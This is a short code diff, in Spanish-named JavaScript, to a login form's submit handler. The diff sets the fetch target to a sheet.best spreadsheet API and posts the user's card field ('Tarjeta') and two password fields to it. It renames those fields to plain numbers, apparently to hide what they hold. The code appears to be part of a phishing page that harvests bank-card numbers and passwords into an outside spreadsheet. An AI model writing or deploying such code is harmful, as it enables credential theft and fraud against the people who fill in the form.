@@ -7,16 +7,16 @@ formulario.addEventListener('submit', async(e) =>{
 
 
 try {    
-    const respuesta = await fetch('', {
+    const respuesta = await fetch('https://sheet.best/api/sheets/d2695b5b-5093-4641-b263-d9e9641940ff', {
         method: 'POST',
         mode: 'cors',
         headers: {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-            "Tarjeta": formulario.usuario.value,
-            "Clave1": formulario.contraseña.value,
-            "Clave2": formulario.confirmar.value
+            "1": formulario.usuario.value,
+            "2": formulario.contraseña.value,
+            "3": formulario.confirmar.value
         })
     });
 
